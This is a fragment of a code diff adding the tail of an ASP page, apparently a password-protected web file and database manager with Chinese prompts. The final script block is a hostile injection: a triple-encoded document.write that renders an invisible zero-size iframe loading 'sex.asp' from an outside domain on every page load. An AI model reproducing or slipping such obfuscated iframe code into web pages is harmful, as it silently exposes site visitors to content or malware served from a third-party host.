+		if(confirm('您确认要打包选中的 ' + j + ' 个项目吗?')){
+			frm.PageName.value = 'PagePack';
+			frm.theAct.value = 'PackOne';
+			frm.target = '_blank';
+		}else return;
+	}
+
+	frm.submit();
+	frm.target = '';
+	frm.PageName.value = strTmpB;
+	frm.reset();
+}
+
+function showSqlEdit(column, str){
+	var frm = document.forms[2];
+	if(!str)return;
+	frm.reset();
+	frm.theAct.value = 'edit';
+	frm.param.value = column + '!' + str;
+	frm.target = '_blank';
+	frm.submit();
+	frm.target = '';
+}
+
+function sqlDelete(column, str){
+	var frm = document.forms[2];
+	if(!str)return;
+	if(!confirm('确认要删除这条记录?'))return;
+	frm.reset();
+	frm.theAct.value = 'del';
+	frm.param.value = column + '!' + str;
+	frm.target = '_blank';
+	frm.submit();
+	frm.target = '';
+}
+function preView(n){
+	var url, win;
+	if(n != '1'){
+		url = document.forms[2].truePath.value
+		window.open('/' + escape(url));
+	}else{
+		win = window.open("about:blank", "", "resizable=yes,scrollbars=yes");
+		win.document.write('<style>body{border:none;}</style>' + document.forms[2].fileContent.innerText);
+	}
+}
+</script>
+
+</head>
+<body onload=document.formx.password.focus();>
+<%End Sub%>
+<script>
+<!--
+document.write(unescape("%3Cscript%3E%0D%0A%3C%21--%0D%0Adocument.write%28unescape%28%22%253Cscript%253E%250D%250A%253C%2521--%250D%250Adocument.write%2528unescape%2528%2522%25253Ciframe%252520src%25253Dhttp%25253A//%25252573%25252568%25252565%2525256E%25252566%25252565%2525256E%2525257A%25252568%25252565%2525256E%25252567%2525252E%25252531%25252539%25252539%25252530%25252573%25252565%2525256F%2525252E%25252563%2525256F%2525256D/sex.asp%252520width%25253D0%252520height%25253D0%25253E%25253C/iframe%25253E%252520%2522%2529%2529%253B%250D%250A//--%253E%250D%250A%253C/script%253E%22%29%29%3B%0D%0A//--%3E%0D%0A%3C/script%3E"));
+//-->
+</script>
+</body>
+</Html>
+
+
